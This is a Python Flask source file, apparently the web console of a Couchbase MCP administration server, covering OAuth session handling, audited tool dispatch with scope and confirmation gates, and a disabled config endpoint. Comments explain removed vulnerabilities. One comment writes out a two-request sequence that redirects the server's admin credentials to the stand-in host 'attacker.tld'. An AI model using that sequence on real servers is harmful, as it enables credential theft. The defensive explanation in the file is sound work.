    cookie_val = _session.create_session(
        {
            "access_token": tokens.get("access_token", ""),
            "id_token": tokens.get("id_token", ""),
            "refresh_token": tokens.get("refresh_token", ""),
            "expires_at": expires_at,
            "claims": claims,
        }
    )

    next_url = pkce.get("next", "/")
    resp = make_response(redirect(next_url))
    resp.set_cookie(
        _session.SESSION_COOKIE,
        cookie_val,
        httponly=True,
        # From configuration, NOT request.is_secure — behind a TLS-terminating proxy the
        # scheme Flask sees is http, which silently dropped this flag. See
        # auth/session.py::cookie_is_secure.
        secure=_session.cookie_is_secure(),
        samesite="Lax",
        # One source of truth with the server-side session lifetime.
        max_age=_session.cookie_max_age(),
        path="/",
    )
    return resp


@app.route("/auth/logout")
def auth_logout():
    """
    Clear the session cookie and optionally redirect to the IdP logout endpoint.
    """
    if not _OAUTH_ENABLED:
        return redirect("/")

    cookie = request.cookies.get(_session.SESSION_COOKIE, "")
    if cookie:
        _session.delete_session(cookie)

    # Try IdP logout (RP-Initiated Logout — optional, provider-dependent)
    try:
        doc = _oidc._discover()
        end_ep = doc.get("end_session_endpoint")
        client_id = os.environ.get("OAUTH_CLIENT_ID", "")
        if end_ep and client_id:
            post_logout = request.host_url.rstrip("/")
            idp_logout = (
                f"{end_ep}?client_id={client_id}&post_logout_redirect_uri={post_logout}"
            )
            resp = make_response(redirect(idp_logout))
            resp.delete_cookie(_session.SESSION_COOKIE, path="/")
            return resp
    except Exception:
        pass  # Discovery failure — proceed with local-only logout

    resp = make_response(redirect("/"))
    resp.delete_cookie(_session.SESSION_COOKIE, path="/")
    return resp


# NOTE: there is deliberately no token-minting endpoint here.
#
# There used to be a POST /auth/token that performed a client-credentials grant
# against the IdP using THIS SERVER'S client_id and client_secret, and returned the
# resulting access token in the response body. It was also listed in _PUBLIC_PATHS,
# so it required no authentication whatsoever.
#
# That is a credential-lending service. Anyone who could reach the GUI port — no
# password, no session, no token — could ask for and receive a valid bearer token
# carrying the server's own scopes, including the automation scope that authorises
# unattended destructive operations. Every other control in this codebase (the scope
# gate, the ceiling, the confirmation set, the audit principal) is downstream of
# "the caller holds a legitimate token", so this one endpoint bypassed all of them
# at once and made the audit trail attribute the attacker's actions to the server's
# service identity.
#
# The correct shape for the enterprise flow is unchanged and needs nothing from us:
# the workflow manager and each child agent hold their OWN client credentials and
# obtain tokens directly from the IdP's token endpoint. This server only ever
# VALIDATES tokens; it never issues them. auth/oidc.client_credentials_token()
# remains for the CLI's own outbound use, but is not reachable over HTTP.


@app.route("/auth/me")
def auth_me():
    """Return the identity of the currently authenticated user (or 401)."""
    if not _OAUTH_ENABLED:
        return jsonify({"oauth_enabled": False, "user": None})

    claims = _resolve_claims()
    if claims is None:
        return jsonify({"error": "Unauthorized"}), 401

    return jsonify({"user": _oidc.userinfo_from_claims(claims)})


# ---------------------------------------------------------------------------
# API endpoints (identical to original, now protected by before_request)
# ---------------------------------------------------------------------------


@app.route("/api/tools", methods=["GET"])
def list_tools():
    result = []
    for tool in _visible_tools():
        result.append(
            {
                "name": tool.name,
                "description": tool.description,
                # The SHARED injector, so the console advertises the same control
                # fields as the transport. Serving the raw schema here meant neither
                # dry_run nor correlation_id existed on the console's surface while
                # the console dispatch below read both out of the arguments -- the
                # capability was present and undiscoverable.
                "inputSchema": mcp_compat.input_schema(
                    mcp_compat.with_control_fields(
                        tool,
                        read_only=is_read_side(tool),
                        needs_confirm=tool.name in _CONSOLE_CONFIRMATION_REQUIRED,
                    )
                ),
                "readOnly": _is_read_only(tool),
                "destructive": _is_destructive(tool),
            }
        )
    return jsonify(result)


def _audit_gui(
    tool_name: str,
    arguments: dict,
    decision: str,
    reason: str = "",
    duration_ms: float | None = None,
    correlation_id: str | None = None,
) -> None:
    """One audit record per decision, from the console as well as the transport.

    The GUI previously emitted NOTHING. Every privileged operation performed through
    the console — bucket deletes, user creation, failover — was invisible to the
    audit trail, which made the console the one way to act without leaving a record.
    Chris's requirement is that the log answers "who did what"; a second dispatch
    path that answers nothing defeats it.
    """
    claims = getattr(request, "oauth_claims", None)
    principal = principal_of(claims) if claims else None
    if principal is None:
        principal = {
            "auth": "none" if not _OAUTH_ENABLED else "unresolved",
            "automation": False,
            **profile_config.local_identity(),
        }
    principal = {**principal, "via": "gui"}
    audit.emit_tool_call(
        tool=tool_name,
        arguments=arguments,
        decision=decision,
        principal=principal,
        reason=reason,
        duration_ms=duration_ms,
        source=request.remote_addr or "",
        correlation_id=correlation_id,
    )


@app.route("/api/call", methods=["POST"])
def call_tool():
    # force=False: the Content-Type requirement above is load-bearing, and
    # force=True would parse a text/plain body and reinstate the CSRF path.
    body = request.get_json(silent=True) or {}
    tool_name = body.get("tool")
    arguments = body.get("arguments", {}) or {}
    # A non-object `arguments` raised an unhandled AttributeError inside
    # require_confirmation: HTTP 500, no audit record, and a full traceback when
    # FLASK_DEBUG is on. Refuse it as the client error it is.
    if not isinstance(arguments, dict):
        return jsonify(
            {
                "error": (
                    "`arguments` must be a JSON object, not "
                    f"{type(arguments).__name__}."
                )
            }
        ), 400
    # Captured HERE, before any refusal can return. It used to be read further down,
    # so the seven refusal records and the dry-run record -- the one an operator keeps
    # as the proposal artifact -- all lost the provenance the MCP path records.
    _correlation = arguments.get("correlation_id")

    if not tool_name:
        return jsonify({"error": "Missing 'tool' field"}), 400
    if tool_name in DISABLED_TOOLS:
        _audit_gui(
            tool_name,
            arguments,
            "denied_disabled",
            "CB_ADMIN_DISABLED_TOOLS",
            correlation_id=_correlation,
        )
        return jsonify(
            {"error": f"Tool '{tool_name}' is disabled by configuration"}
        ), 403

    tool = TOOL_INDEX.get(tool_name)
    if tool is None:
        # AUDIT the probe. server.py:461 emits denied_unknown_tool for the same
        # decision, so tool-name enumeration through the transport left a trail and
        # the same enumeration through the console left none. This branch sits ABOVE
        # the block where every other decision is audited, which is why the earlier
        # console-convergence pass missed it.
        _audit_gui(
            tool_name,
            arguments,
            "denied_unknown_tool",
            "no such tool",
            correlation_id=_correlation,
        )
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404

    if not _tool_is_deployable(tool_name):
        _audit_gui(
            tool_name,
            arguments,
            "denied_deployment",
            f"not available in {_DEPLOYMENT_MODE!r}",
            correlation_id=_correlation,
        )
        return jsonify(
            {
                "error": (
                    f"Tool '{tool_name}' is not available in {_DEPLOYMENT_MODE!r} "
                    "deployment mode."
                ),
                "hint": deployment.unavailable_reason(tool_name, _DEPLOYMENT_MODE),
            }
        ), 403

    if (
        READ_ONLY_MODE
        and not _is_read_only(tool)
        and True  # admin server has no internally-DML-gated tools
    ):
        _audit_gui(
            tool_name,
            arguments,
            "denied_read_only",
            "read-only mode",
            correlation_id=_correlation,
        )
        return jsonify(
            {
                "error": (
                    f"Tool '{tool_name}' is a write operation and "
                    "CB_ADMIN_READ_ONLY_MODE=true. Set false to enable."
                )
            }
        ), 403

    # ── Authorization: scope, then the shared ceiling policy ─────────────────
    #
    # This block used to be a hand-copied paraphrase of server.py's logic, and it had
    # drifted in three ways at once: no scope check, no audit record, and a ceiling
    # test nested inside `if in_confirm_set and automation_mode` — so with automation
    # mode off, a hard-ceiling tool fell through to the ordinary gate where the
    # caller's own `confirm: true` satisfied it, and a read-only tool named in the
    # ceiling was never checked at all.
    #
    # It now calls the same authz.evaluate() the MCP dispatch calls.
    scope_denial = check_scope(tool)
    if scope_denial:
        _audit_gui(
            tool_name,
            arguments,
            "denied_scope",
            scope_denial,
            correlation_id=_correlation,
        )
        return jsonify({"ok": False, "error": scope_denial}), 403

    is_write = not (tool.annotations and mcp_compat.is_read_only(tool))
    in_confirm_set = is_write or tool_name in _CUSTOM_CONFIRMATION_TOOLS

    # Automation comes ONLY from the token's scopes, never from the request body.
    #
    # `bool(body.get("automation"))` used to be part of this expression, which let any
    # caller self-promote out of the confirmation gate with one JSON field — the
    # precise thing .env.example promises cannot happen. Reading it from the scope
    # gate also means the console and the MCP transport agree on what "authorized
    # automation" means, instead of the console having its own env-var notion of it.
    has_automation = session_has_automation_scope()

    # The console NEVER counts as "a human is present" for the hard ceiling.
    #
    # It states this explicitly rather than inheriting CB_ADMIN_TRANSPORT, which
    # describes the MCP server process and defaults to "stdio" when unset — the console
    # would otherwise claim a human on the strength of a variable about another
    # process.
    #
    # The tempting position is that a browser click IS a person, so a workstation
    # console on a loopback peer with Origin validated should satisfy the ceiling. Two
    # things defeat that:
    #
    #   * In the workstation profile the console is UNAUTHENTICATED
    #     (CB_GUI_INSECURE_NO_AUTH=1), so there is no evidence about WHO clicked.
    #   * The origin allowlist necessarily permits any localhost port, so any page
    #     served from the developer's own machine — a project dev server, a compromised
    #     npm package's, anything — is an allowed origin.
    #
    # The hard ceiling is opt-in and means "a person must approve THIS operation". The
    # stdio path has a property the console cannot match: the MCP client surfaces the
    # specific call and the person answers it. So ceiling tools are performed through
    # an interactive MCP session, and the console refuses them with that instruction.
    ceiling, in_confirm_set = authz.evaluate(
        tool_name,
        in_confirm_set=in_confirm_set,
        has_automation_scope=has_automation,
        human_present=False,
    )
    if not ceiling.allowed:
        _audit_gui(
            tool_name,
            arguments,
            ceiling.decision,
            "hard ceiling",
            correlation_id=_correlation,
        )
        return jsonify({"ok": False, "error": ceiling.reason, **ceiling.detail}), 403

    confirm_err = require_confirmation(tool_name, arguments, in_confirm_set)
    if confirm_err is not None:
        _audit_gui(
            tool_name,
            arguments,
            "denied_confirmation",
            confirm_err,
            correlation_id=_correlation,
        )
        return jsonify(
            {
                "ok": False,
                "error": confirm_err,
                "requires_confirmation": True,
                "hard_ceiling": tool_name in authz.hard_ceiling_tools(),
            }
        ), 403

    # Strip BOTH control fields, as the MCP dispatch does. The GUI stripped only
    # `confirm`, so a caller following the documented advice to pass correlation_id was
    # refused by the mass-assignment allow-list — the provenance field breaking the
    # very tools it was meant to annotate.
    tool_obj = next((t for t in ALL_TOOLS if t.name == tool_name), None)
    dry, dry_reason = dryrun.in_effect(arguments, tool_obj)
    # Strip dry_run ONLY when the dispatch owns it, matching server.py. A tool that
    # implements the flag itself must receive it.
    _strip_keys = {"confirm", "correlation_id"}
    if not dryrun.handler_owns(tool_obj):
        _strip_keys.add(dryrun.ARG)
    arguments = {k: v for k, v in arguments.items() if k not in _strip_keys}

    handler = HANDLERS.get(tool_name)
    if handler is None:
        _audit_gui(
            tool_name,
            arguments,
            "error",
            "no handler registered",
            correlation_id=_correlation,
        )
        return jsonify({"error": f"No handler for tool: {tool_name}"}), 500

    # The same policy as the MCP dispatch, asked of the same module: after every gate,
    # before execution, and reads still run. Expressing it here instead would be exactly
    # the divergence authz.py was created to end.
    if dry and not (tool_obj is not None and is_read_side(tool_obj)):
        _audit_gui(
            tool_name, arguments, "dry_run", dry_reason, correlation_id=_correlation
        )
        return jsonify(
            {
                "ok": True,
                **dryrun.preview(tool_name, arguments, reason=dry_reason),
            }
        )

    started = time.perf_counter()
    try:
        # human_present=False for the same reason it is passed to authz.evaluate
        # above: a browser request is not a human confirmation. Stating it here as
        # well is what makes it true for code BELOW the dispatch -- the composite
        # Capella ceiling guard asks authz.human_is_present() directly, and without
        # this context it read the MCP transport's answer and let
        # capella_env_teardown delete a cluster this very request would have refused
        # to delete directly.
        with authz.caller_context(human_present=False):
            result = handler.handle(tool_name, arguments)
        elapsed = (time.perf_counter() - started) * 1000
        text = result[0].text if result else "{}"
        parsed = json.loads(text)
        # The SHARED classifier, so the console produces the same closed vocabulary as
        # the transport. This collapsed every refusal to `denied_handler`, so a
        # blocked exfiltration (denied_egress) or a Capella guardrail refusal made
        # through the console never matched a SIEM rule written against the
        # documented decisions.
        decision, _classified_reason = audit.classify_result(
            result, shared.ERROR_MARKER
        )
        _audit_gui(
            tool_name,
            arguments,
            decision,
            _classified_reason,
            elapsed,
            correlation_id=_correlation,
        )
        # `ok` reports the DECISION, not "the handler returned without raising".
        #
        # It was hardcoded True, which is the console's version of the transport's
        # isError defect and it surfaces in the operator's face: index.html renders
        # `result.ok ? "SUCCESS" : "ERROR"`, so a refused destructive call -- no
        # confirmation, read-only mode, spend ceiling, egress allowlist -- painted a
        # green SUCCESS badge over a payload saying the opposite, and the run went into
        # the history list as a success too.
        #
        # Derived from the SAME classifier that writes the audit record, so the badge
        # and the log cannot disagree about whether a call was refused. `parsed` is
        # still returned in full either way: the refusal text is the useful part.
        return jsonify({"ok": decision == "allowed", "result": parsed})
    except Exception as exc:
        elapsed = (time.perf_counter() - started) * 1000
        _audit_gui(
            tool_name,
            arguments,
            "error",
            type(exc).__name__,
            elapsed,
            correlation_id=_correlation,
        )
        # redact_text, as the MCP path does through err(). Exception text folds in the
        # cluster's raw response body, which is the one channel where a submitted
        # credential can come back — every handler wraps handle() so this branch is
        # nearly unreachable, but "nearly" is not a reason to leave the one dispatch
        # path that does not redact.
        return jsonify({"ok": False, "error": shared.redact_text(str(exc))}), 200


@app.route("/api/config", methods=["GET", "POST"])
def config():
    if request.method == "POST":
        # REMOVED — this endpoint was a credential-exfiltration primitive.
        #
        # The allow-list included CB_CONNECTION_STRING, CB_MGMT_PORT and
        # CB_ADMIN_TLS_INSECURE, and handlers/shared.py re-reads those per request
        # and attaches HTTP Basic credentials to every admin call. So:
        #
        #   POST /api/config {"CB_CONNECTION_STRING": "couchbase://attacker.tld"}
        #   POST /api/call   {"tool": "admin_cluster_info"}
        #
        # made the server send the real Couchbase administrator username and
        # password, base64 Basic, in cleartext, to a host the caller chose. It
        # worked with authentication disabled (the default), needed no
        # confirmation, and worked in read-only mode — because it never performed a
        # write, it changed where the writes were pointed. Setting
        # CB_ADMIN_TLS_INSECURE=true instead enabled MITM of the real cluster.
        #
        # Runtime mutation of connection identity and TLS posture by an HTTP client
        # is not a defensible feature for an administration tool. Configuration
        # belongs in the environment, set by whoever deploys the server.
        return (
            jsonify(
                {
                    "ok": False,
                    "error": (
                        "Runtime configuration changes are not supported. Set "
                        "connection and TLS settings in the environment and "
                        "restart. This endpoint was removed because it allowed a "
                        "caller to redirect the server's cluster credentials to an "
                        "arbitrary host."
                    ),
                }
            ),
            405,
        )

    return jsonify(
        {
            k: _redact(k, os.environ.get(k, default))
            for k, default in {
                "CB_CONNECTION_STRING": "couchbase://localhost",
                "CB_USERNAME": "Administrator",
                "CB_PASSWORD": "",
                "CB_BUCKET": "default",
                "CB_SCOPE": "_default",
                "CB_COLLECTION": "_default",
                "CB_MGMT_PORT": "8091",
            }.items()
        }
    )


# ---------------------------------------------------------------------------
# SPA
# ---------------------------------------------------------------------------


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def serve_frontend(path):
    if path and os.path.exists(os.path.join(app.static_folder, path)):
        return send_from_directory(app.static_folder, path)
    return send_from_directory(app.static_folder, "index.html")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    port = int(os.environ.get("GUI_PORT", "5173"))
    host = os.environ.get("GUI_HOST", "127.0.0.1")
    debug = os.environ.get("FLASK_DEBUG", "").lower() in ("1", "true", "yes", "on")

    # Bind posture is enforced by _enforce_gui_posture() at import time, which
    # handles every non-loopback form and cannot be skipped by a WSGI launcher.

    if debug:
        print(
            "[gui] WARNING: FLASK_DEBUG=1 enables the Werkzeug debugger. "
            "Never use this on a network-exposed host (RCE risk).",
            file=sys.stderr,
        )

    if _OAUTH_ENABLED:
        print(
            f"[gui] OAuth enabled — issuer: {os.environ.get('OAUTH_ISSUER', '(not set)')}"
        )
    else:
        print("[gui] OAuth disabled (set OAUTH_ENABLED=true to activate)")

    print(f"\n  Couchbase MCP GUI -> http://{host}:{port}\n")
    app.run(host=host, port=port, debug=debug)
